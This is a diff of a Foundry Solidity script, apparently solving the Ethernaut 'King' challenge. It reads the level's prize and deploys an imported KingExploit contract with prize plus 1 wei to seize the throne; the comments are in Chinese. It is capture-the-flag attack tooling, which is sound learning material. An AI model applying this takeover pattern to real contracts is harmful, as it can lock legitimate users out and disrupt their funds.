@@ -2,24 +2,22 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Script.sol";
+import {KingExploit} from "../src/KingExploit.sol";
 
 interface IKing {
-    function king() external view returns (address);
-    function claimThrone() external payable;
+    function prize() external view returns (uint256);
 }
 
 contract KingAttack is Script {
     function run() external {
-        // King 关卡地址
-        address kingLevel = 0xdaEa6E829a45F3bF1C0C455aa387D7dBD57F1aAF;
+        address payable kingLevel = payable(0x9A79e3704CB220F165304e669b9Ed2bA6765B53d);
 
-        // 开始广播交易
+        // 获取当前 prize，发送 prize + 1 wei 来成为 King
+        uint256 currentPrize = IKing(kingLevel).prize();
+        uint256 amountToSend = currentPrize + 1 wei;
+
         vm.startBroadcast();
-
-        // 部署攻击合约，在构造函数中自毁并调用 claimThrone
-        KingExploit exploit = new KingExploit{value: 1 ether}(payable(kingLevel));
-
-        // 停止广播
+        new KingExploit{value: amountToSend}(kingLevel);
         vm.stopBroadcast();
     }
 }
